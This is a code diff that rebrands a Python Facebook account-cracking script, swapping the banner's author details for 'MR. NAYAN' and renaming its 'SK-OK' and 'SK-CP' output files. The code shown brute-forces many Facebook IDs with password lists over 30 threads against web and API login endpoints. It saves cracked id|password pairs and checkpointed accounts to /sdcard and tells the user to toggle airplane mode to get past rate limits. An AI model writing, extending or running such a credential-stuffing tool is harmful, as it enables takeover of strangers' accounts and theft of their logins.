@@ -518,21 +518,21 @@ for agenku in range(10000):
 
 
 logo=("""""""""
-\33[1;91m ######        ##    ## 
-\33[1;92m##    ##       ##   ##  
-\33[1;93m##             ##  ##   
-\33[1;94m ######        #####    
-\33[1;95m      ##       ##  ##   
-\33[1;96m##    ##       ##   ##  
-\33[1;97m ######        ##    ## 
-                       \33[;92m Pro
-  \33[;97m
-=======================================================
-\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : Lala Sherry
-\033[;37m\033[;97m         Version          \033[;37m\033[;92m: 10.8   
-\033[;37m=======================================================
- I dont caree what then \033[;96mPeople\033[;37m Think About \033[;92m Me \033[;37m
-=======================================================""")
+\033[0;92m╔══════════════════════════════════════════════╗
+\033[0;32m║ ███    ██  \033[0;31m█████  \033[0;93m██    ██  \033[0;32m█████  \033[0;31m███    ██\033[0;92m ║
+\033[0;32m║ ████   ██ \033[0;31m██   ██  \033[0;93m██  ██  \033[0;32m██   ██ \033[0;31m████   ██\033[0;92m ║
+\033[0;32m║ ██ ██  ██ \033[0;31m███████   \033[0;93m████   \033[0;32m███████ \033[0;31m██ ██  ██\033[0;92m ║
+\033[0;32m║ ██  ██ ██ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██  ██ ██\033[0;92m ║
+\033[0;92m║ ██   ████ \033[0;31m██   ██    \033[0;93m██    \033[0;32m██   \033[0;32m██ \033[0;31m██   ████\033[0;92m ║
+\033[0;92m╚══════════════════════════════════════════════╝
+\033[0;92m╔═══════════════════════════════════════════╗\033[0;92m╔═══╗
+\033[0;92m║➣\033[0;31m DEVOLPER   :   \033[0;34m       MR. NAYAN          ║\033[0;32m║\033[1;31m N \033[1;32m║
+\033[0;92m║➣\033[0;33m FACEBOOK   :    \033[0;35m      Mohammad Nayan     ║\033[0;32m║\033[1;312m A\033[0;92m ║
+\033[0;92m║═══════════════════════════════════════════║\033[0;32m║\033[1;34m Y\033[0;92m ║
+\033[0;92m║➣\033[0;91m WHATSAPP   :    \033[0;92m      01615298449        ║\033[0;32m║\033[1;93m A\033[0;92m ║
+\033[0;92m║➣\033[0;93m GITHUB     :     \033[0;94m     MR-NAYAN-404       ║\033[0;92m║\033[1;92m N\033[0;92m ║
+\033[0;92m║➣\033[0;94m TOOLS      :      \033[0;93m    Public Tool        ║\033[0;92m║ 😘║
+\033[0;92m╚═══════════════════════════════════════════╝\033[0;92m╚═══╝               """)
 
 def linex():
 	print("=======================================================")
@@ -685,8 +685,9 @@ def public():
                 with tred(max_workers=30) as crack_submit:
                         clear()
                         total_ids = str(len(id))
-                        print('Total account : \033[1;97m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;97mMethod -> \033[1;97mM{mthd}')
-                        print("\033[1;97mUse flight mode for speed up\033[1;97m")
+                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mTOTAL IDS : \033[1;92m'+total_ids+f' \033[1;33m>\033[1;36m> \n\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mMethod: \033[1;92m -> \033[1;97mM{mthd}')
+                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[97;1mUSE \033[1;34m[\033[1;32mDATA\033[1;97m/\033[38;5;196mWIFI\033[1;34m] ')
+                        print('\033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE ')
                         linex()
                         for user in id:
                                 ids,names = user.split('|')
@@ -949,7 +950,7 @@ def gmail():
                 os.system('python Pro.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;97m [cracking] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -974,14 +975,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Sk:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m SK-OK %s | %s'%(ids,pas))
-                                open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [NAYAN-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/NAYAN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Sk:
                                 if 'y' in pcp:
                                         print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -995,7 +996,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;97m [MR.NAYAN] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -1049,14 +1050,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m SK-OK '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [NAYAN-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/NAYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\033[1;97m [NAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -1069,7 +1070,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;97m [Process] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;97m [CRACKING] %s|\033[1;32mOK:-%s \033[1;97m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -1123,14 +1124,14 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32mSK-OK '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m[NAYAN-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/NAYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\033[1;97m SK-CP '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\033[1;97m [NAYAN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NAYAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -1196,16 +1197,16 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/SK-OK.txt','r').read()
+                                                okk=open('/sdcard/NAYAN-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m SK-OK '+uid+' | '+pas+'\033[1;97m')
+                                                        print('\r\r\033[1;32m NAYAN-OK '+uid+' | '+pas+'\033[1;97m')
                                                         open('/sdcard/SK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32mSK-OK '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m[NAYAN-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NAYAN-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
